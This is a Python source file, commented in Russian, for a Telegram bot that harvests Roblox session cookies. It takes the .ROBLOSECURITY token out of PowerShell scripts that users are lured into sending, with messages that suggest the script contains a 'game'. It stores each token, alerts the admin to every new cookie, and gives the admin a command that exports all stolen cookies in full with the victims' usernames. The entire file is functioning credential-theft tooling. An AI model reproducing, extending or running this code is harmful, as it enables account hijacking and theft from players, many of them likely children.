import re
import logging
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ContextTypes, filters, CallbackQueryHandler
)

from config import Config
from database import Database

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class RobloxCookieBot:
    def __init__(self):
        self.config = Config()
        self.db = Database(self.config.DB_PATH)
        self.app = Application.builder().token(self.config.BOT_TOKEN).build()
        
        # Регистрация обработчиков
        self.setup_handlers()
    
    def setup_handlers(self):
        # Команды
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        self.app.add_handler(CommandHandler("mycookies", self.my_cookies_command))
        
        # Админ команды
        self.app.add_handler(CommandHandler("stats", self.stats_command))
        self.app.add_handler(CommandHandler("users", self.users_command))
        self.app.add_handler(CommandHandler("broadcast", self.broadcast_command))
        self.app.add_handler(CommandHandler("delete", self.delete_command))
        self.app.add_handler(CommandHandler("export", self.export_command))
        
        # Обработка текстовых сообщений
        self.app.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND, 
            self.handle_text_message
        ))
        
        # Обработка документов
        self.app.add_handler(MessageHandler(
            filters.Document.ALL, 
            self.handle_document
        ))
        
        # Callback queries
        self.app.add_handler(CallbackQueryHandler(self.handle_callback))
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        chat = update.effective_chat
        
        # Добавляем пользователя в базу
        self.db.add_user(
            user_id=user.id,
            username=user.username,
            first_name=user.first_name,
            last_name=user.last_name or ""
        )
        
        # Отправляем приветственное сообщение
        await update.message.reply_text(
            self.config.WELCOME_MESSAGE,
            parse_mode='Markdown'
        )
        
        # Если это админ, показываем админ-команды
        if user.id == self.config.ADMIN_ID:
            await update.message.reply_text(
                self.config.ADMIN_COMMANDS,
                parse_mode='Markdown'
            )
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "Просто отправьте мне PowerShell скрипт с куки Roblox.\n"
            "Я автоматически извлеку .ROBLOSECURITY куки и сохраню их.",
            parse_mode='Markdown'
        )
    
    def extract_roblox_cookie(self, text: str) -> str:
        """
        Извлекает .ROBLOSECURITY куки из PowerShell скрипта
        """
        # Паттерн для поиска .ROBLOSECURITY куки
        pattern = r'\.ROBLOSECURITY["\']?\s*,\s*["\']([^"\']+)["\']'
        
        # Ищем совпадения
        matches = re.search(pattern, text)
        if matches:
            return matches.group(1)
        
        # Альтернативный паттерн
        pattern2 = r'\.ROBLOSECURITY["\']?\s*,\s*["\'](.*?_\|WARNING:.*?)\s*["\']'
        matches2 = re.search(pattern2, text, re.DOTALL)
        if matches2:
            return matches2.group(1)
        
        # Если не нашли, возвращаем пустую строку
        return ""
    
    async def handle_text_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        text = update.message.text
        
        # Обновляем активность пользователя
        self.db.update_user_activity(user.id)
        
        # Пытаемся извлечь куки из текста
        cookie = self.extract_roblox_cookie(text)
        
        if cookie:
            # Сохраняем куки в базу
            self.db.save_cookie(user.id, cookie)
            
            # Отправляем подтверждение
            await update.message.reply_text(
                self.config.COOKIE_EXTRACTED.format(
                    user_id=user.id,
                    time=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                ),
                parse_mode='Markdown'
            )
            
            # Уведомляем админа
            if self.config.ADMIN_ID and self.config.ADMIN_ID != user.id:
                try:
                    await context.bot.send_message(
                        chat_id=self.config.ADMIN_ID,
                        text=f"📥 Новый куки от @{user.username or user.id}\n"
                             f"👤 ID: {user.id}\n"
                             f"📏 Длина: {len(cookie)} символов\n"
                             f"🕒 Время: {datetime.now().strftime('%H:%M:%S')}"
                    )
                except Exception as e:
                    logger.error(f"Не удалось уведомить админа: {e}")
        else:
            await update.message.reply_text(
                "❌ *Не удалось найти игру в тексте*\n\n"
                "Убедитесь, что вы отправили полный PowerShell скрипт с игрой Invoke-WebRequest.",
                parse_mode='Markdown'
            )
    
    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка документов (если пользователь отправляет файл)"""
        document = update.message.document
        
        if document.file_name and (document.file_name.endswith('.txt') or document.file_name.endswith('.ps1')):
            # Скачиваем файл
            file = await document.get_file()
            file_content = await file.download_as_bytearray()
            text = file_content.decode('utf-8')
            
            # Извлекаем куки
            cookie = self.extract_roblox_cookie(text)
            
            if cookie:
                user = update.effective_user
                self.db.save_cookie(user.id, cookie)
                
                await update.message.reply_text(
                    self.config.COOKIE_EXTRACTED.format(
                        user_id=user.id,
                        time=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    ),
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text(
                    "❌ Не удалось извлечь куки из файла.",
                    parse_mode='Markdown'
                )
        else:
            await update.message.reply_text(
                "❌ Пожалуйста, отправьте .txt или .ps1 файл с PowerShell скриптом."
            )
    
    async def my_cookies_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Показать куки пользователя"""
        user = update.effective_user
        cookies = self.db.get_user_cookies(user.id)
        
        if not cookies:
            await update.message.reply_text(
                "📭 У вас еще нет сохраненных куки.",
                parse_mode='Markdown'
            )
            return
        
        message = f"📁 *Ваши куки ({len(cookies)}):*\n\n"
        
        for i, cookie_data in enumerate(cookies[:5], 1):  # Показываем только первые 5
            cookie_preview = cookie_data['cookie'][:50] + "..." if len(cookie_data['cookie']) > 50 else cookie_data['cookie']
            message += f"{i}. `{cookie_preview}`\n"
            message += f"   ⏰ {cookie_data['time']}\n\n"
        
        if len(cookies) > 5:
            message += f"... и еще {len(cookies) - 5} куки"
        
        await update.message.reply_text(message, parse_mode='Markdown')
    
    # АДМИН КОМАНДЫ
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Статистика бота"""
        if update.effective_user.id != self.config.ADMIN_ID:
            await update.message.reply_text("❌ У вас нет прав доступа.")
            return
        
        stats = self.db.get_stats()
        
        message = (
            "📊 *Статистика бота:*\n\n"
            f"👥 Всего пользователей: `{stats['total_users']}`\n"
            f"🍪 Всего куки: `{stats['total_cookies']}`\n"
            f"👤 Пользователей с куки: `{stats['users_with_cookies']}`\n"
            f"📈 Среднее куки на пользователя: `{stats['avg_cookies_per_user']:.2f}`\n"
        )
        
        await update.message.reply_text(message, parse_mode='Markdown')
    
    async def users_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Список пользователей"""
        if update.effective_user.id != self.config.ADMIN_ID:
            await update.message.reply_text("❌ У вас нет прав доступа.")
            return
        
        users = self.db.get_all_users()
        
        if not users:
            await update.message.reply_text("📭 В базе нет пользователей.")
            return
        
        message = f"👥 *Список пользователей ({len(users)}):*\n\n"
        
        for user in users[:20]:  # Ограничиваем вывод
            message += (
                f"🆔 ID: `{user['user_id']}`\n"
                f"👤 Имя: {user['first_name']}\n"
                f"📛 Юзернейм: @{user['username'] or 'нет'}\n"
                f"🍪 Куки: {user['cookie_count']}\n"
                f"📅 Регистрация: {user['registered_at']}\n"
                f"🕒 Активность: {user['last_activity']}\n"
                f"────────────────────\n"
            )
        
        if len(users) > 20:
            message += f"\n... и еще {len(users) - 20} пользователей"
        
        await update.message.reply_text(message, parse_mode='Markdown')
    
    async def broadcast_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Рассылка сообщений"""
        if update.effective_user.id != self.config.ADMIN_ID:
            await update.message.reply_text("❌ У вас нет прав доступа.")
            return
        
        if not context.args:
            await update.message.reply_text(
                "📢 *Использование:* /broadcast <текст сообщения>\n\n"
                "Пример: /broadcast Привет всем пользователям!",
                parse_mode='Markdown'
            )
            return
        
        message_text = ' '.join(context.args)
        users = self.db.get_all_users()
        
        await update.message.reply_text(
            f"🔄 Начинаю рассылку для {len(users)} пользователей..."
        )
        
        success = 0
        failed = 0
        
        for user in users:
            try:
                await context.bot.send_message(
                    chat_id=user['user_id'],
                    text=f"📢 \n\n{message_text}",
                    parse_mode='Markdown'
                )
                success += 1
                await asyncio.sleep(0.1)  # Задержка между сообщениями
            except Exception as e:
                logger.error(f"Failed to send to {user['user_id']}: {e}")
                failed += 1
        
        await update.message.reply_text(
            f"✅ *Рассылка завершена:*\n\n"
            f"✅ Успешно: {success}\n"
            f"❌ Не удалось: {failed}",
            parse_mode='Markdown'
        )
    
    async def delete_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Удалить пользователя"""
        if update.effective_user.id != self.config.ADMIN_ID:
            await update.message.reply_text("❌ У вас нет прав доступа.")
            return
        
        if not context.args:
            await update.message.reply_text(
                "🗑️ *Использование:* /delete <user_id>\n\n"
                "Пример: /delete 123456789",
                parse_mode='Markdown'
            )
            return
        
        try:
            user_id = int(context.args[0])
            success = self.db.delete_user(user_id)
            
            if success:
                await update.message.reply_text(
                    f"✅ Пользователь `{user_id}` удален.",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text(
                    f"❌ Пользователь `{user_id}` не найден.",
                    parse_mode='Markdown'
                )
        except ValueError:
            await update.message.reply_text("❌ Неверный ID пользователя.")
    
    async def export_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Экспорт всех куки"""
        if update.effective_user.id != self.config.ADMIN_ID:
            await update.message.reply_text("❌ У вас нет прав доступа.")
            return
        
        cookies = self.db.get_all_cookies()
        
        if not cookies:
            await update.message.reply_text("📭 Нет сохраненных куки.")
            return
        
        # Создаем текстовый файл
        export_text = f"# Экспорт куки Roblox\n"
        export_text += f"# Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        export_text += f"# Всего куки: {len(cookies)}\n\n"
        
        for cookie in cookies:
            export_text += f"🔸 Куки #{cookie['user_id']}\n"
            export_text += f"👤 Пользователь: @{cookie['username'] or 'нет'} (ID: {cookie['user_id']})\n"
            export_text += f"🕒 Дата: {cookie['extracted_at']}\n"
            export_text += f"🔐 Cookie: {cookie['cookie']}\n"
            export_text += "─" * 50 + "\n\n"
        
        # Сохраняем временный файл
        filename = f"cookies_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(export_text)
        
        # Отправляем файл
        with open(filename, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=filename,
                caption=f"📤 Экспортировано {len(cookies)} куки"
            )
    
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка callback запросов"""
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(text=f"Выбрано: {query.data}")
    
    def run(self):
        """Запуск бота"""
        print("🤖 Бот запущен...")
        print(f"Токен: {self.config.BOT_TOKEN[:10]}...")
        print(f"Админ ID: {self.config.ADMIN_ID}")
        self.app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == '__main__':
    bot = RobloxCookieBot()
    bot.run()
